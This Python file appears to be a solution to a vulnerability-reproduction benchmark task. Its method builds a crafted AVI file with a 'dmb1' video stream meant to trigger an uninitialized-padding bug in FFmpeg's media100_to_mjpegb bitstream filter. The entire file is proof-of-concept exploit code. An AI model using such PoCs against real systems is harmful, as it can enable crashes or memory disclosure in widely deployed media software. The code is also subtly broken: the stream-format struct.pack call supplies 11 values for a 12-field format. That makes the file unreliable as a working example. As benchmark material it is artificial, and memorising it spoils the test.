import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is in the bsf/media100_to_mjpegb module, specifically an uninitialized 
        value usage due to output buffer padding not being cleared. To trigger this, we generate 
        a valid AVI file with a video track encoded as 'dmb1' (Media 100). When processed, 
        FFmpeg will engage the media100_to_mjpegb bitstream filter.
        """
        
        def pack_fourcc(s):
            return s.encode('ascii') if isinstance(s, str) else s

        def make_chunk(tag, data):
            pad = b''
            if len(data) % 2 == 1:
                pad = b'\x00'
            return pack_fourcc(tag) + struct.pack('<I', len(data)) + data + pad

        def make_list(list_type, chunks):
            return make_chunk('LIST', pack_fourcc(list_type) + b''.join(chunks))

        # AVI Parameters
        width = 128
        height = 128
        fps = 30
        
        # --- AVI Header (avih) ---
        # 56 bytes structure
        # MicroSecPerFrame, MaxBytesPerSec, PaddingGranularity, Flags, TotalFrames, 
        # InitialFrames, Streams, SuggestedBufferSize, Width, Height, Reserved[4]
        avih = struct.pack('<IIIIIIIIII4I',
            33333, 0, 0, 0, 1, 0, 1, 0, width, height, 0, 0, 0, 0
        )
        avih_chunk = make_chunk('avih', avih)

        # --- Stream Header (strh) ---
        # 56 bytes structure
        # fccType, fccHandler, Flags, Priority, Language, InitialFrames, Scale, Rate, ...
        # Handler 'dmb1' triggers Media 100 processing
        strh = struct.pack('<4s4sIIIIIIIIIIHHI',
            b'vids', b'dmb1', 0, 0, 0, 0, 1, fps, 0, 1, 0, 0, 0, 0, 0
        )
        strh_chunk = make_chunk('strh', strh)

        # --- Stream Format (strf) ---
        # BITMAPINFOHEADER (40 bytes)
        # Size, Width, Height, Planes, BitCount, Compression, SizeImage, ...
        # Compression 'dmb1' is critical
        frame_data_len = 256
        strf = struct.pack('<IIIHH4sIIIIII',
            40, width, height, 1, 24, b'dmb1', frame_data_len, 0, 0, 0, 0
        )
        strf_chunk = make_chunk('strf', strf)

        # --- Lists Construction ---
        strl_list = make_list('strl', [strh_chunk, strf_chunk])
        hdrl_list = make_list('hdrl', [avih_chunk, strl_list])

        # --- Frame Data ---
        # Simple payload. The vulnerability relies on the BSF processing this packet 
        # and producing an output packet with uninitialized padding. 
        # 0x11 to avoid completely empty/black checks if any.
        payload = b'\x11' * frame_data_len
        
        # --- Movie List (movi) ---
        # '00dc' corresponds to Stream 00 Compressed Video
        movi_list = make_list('movi', [make_chunk('00dc', payload)])

        # --- Final RIFF AVI Container ---
        avi_file = make_chunk('RIFF', b'AVI ' + hdrl_list + movi_list)
        
        return avi_file